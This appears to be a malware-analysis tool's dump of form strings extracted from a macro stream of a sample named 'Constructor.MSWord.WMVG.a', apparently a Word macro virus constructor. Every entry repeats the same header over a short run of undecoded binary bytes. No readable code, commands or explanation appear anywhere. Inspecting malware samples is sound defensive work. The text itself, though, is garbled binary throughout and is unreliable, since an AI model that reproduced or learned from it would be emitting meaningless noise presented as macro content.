VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�:+�D�����q� ��vzLIpa�2P�ɛpG�r�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Դ���L#�AN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y	+8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�¨I�3�^2)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�_Jk)hc��x���v<�A��Ii]��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�0^DQGS]땈�%	#�C�lT.�'m��)�6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V<h9��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�Z��D��(i�>�aީJ�p��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
���٨:a�E[
�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ȕ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+,�$�R��튴��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WS��6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������z/`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E�2%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j��f����?�r<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nP����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I2u��E ���L���q_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��<�9R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��cJ3��bW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dYDn�n��!�����Ç=@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MՄ��d�AR��7U߶ec�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4:ĳ3_-EX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
փ�G����_���1�[�{�t�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@jjM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hWҮ��Ē$Dq,T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hˡk:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ř
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�7Ǉ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T��J-w?�#2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D����Q�;v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(0�|r�6�j*Z�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q2�Oc�sE���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�8��~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T'�vp��-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;q闂ո@6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ���e��M�
o��ɂ���pr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/CJ��B�ZMs'�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�#VcA��d��e�_i�,P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+##:H	��y#u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6I	��&��u�P��p�+�V�c�����|n��Ŋ��Y��(���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�����F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��
�Aisu0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e`h��`	$�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�k�s�̞��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�����Š��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%IoJ@:��~���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�5�Kl��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N��H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|:d�?�8?�LE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\B�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:�F��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"b�d6��̠XM��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2C����D����"U";f�XUdG�Ԏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�P#Rm��̡�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p���E�f����cM¢�,�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�|4�X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
݊�A�r���nRY8,D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����#�Te�//�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�Ƶ���Ң�Gդ���Z|5
T�V��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9^,=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}4�H�}��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j>���:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	Q��RGݍ*{���M�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=0��Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��uĮ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�iL@CQ�c���4�\D�`TB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�
[[��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�Ў��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=(�G�+�V�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W=�r����轱
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)pb%*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
64�1J��)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�e�8�	4�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�\(��lh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S4�Nw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Fj���ڹ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A(�� X���c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@Qێ�Y,�E#��T��J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�*�`z�b��_�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"U4�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X����J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�A)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3+'/��q"��|Ɇ6�M v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@6̀
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�әkz�:l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������d6�~?�%���kn+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǃ|<d�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�?���L㠽���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P5$Mء=9���G-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aܥ�_�7�_}R}:X�`9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b7��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rGG���.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q(�Z�]����n[��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�i��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���im�o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�M	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xv;��0J[&�{<�nmx���P�����f�c㔌@r,�?5�{v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z�
&=�&��~�Y� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F<���,'_\|En_�]���S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�".c(쓫)]�^��1�D��S�Gy��dBx�Mї�!=�od��:I2��
LE��B	�I����C.ǐ��n<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E-���ʼ�Vx�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��eˆJ�[e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~Y (�(��k��UP?d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͸%��e�&0hMnU�HZd �R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MT�e+�ɠ̔d��J)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z���V$��=�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�."hWibr{	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yl*�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ע�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ɩ=� �F���T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X�?�L�����}X�=�r�$9,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>#����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0->�wO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.WMVG.a' - OLE stream: 'Macros/WMVGExtras/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q�YQD
-------------------------------------------------------------------------------
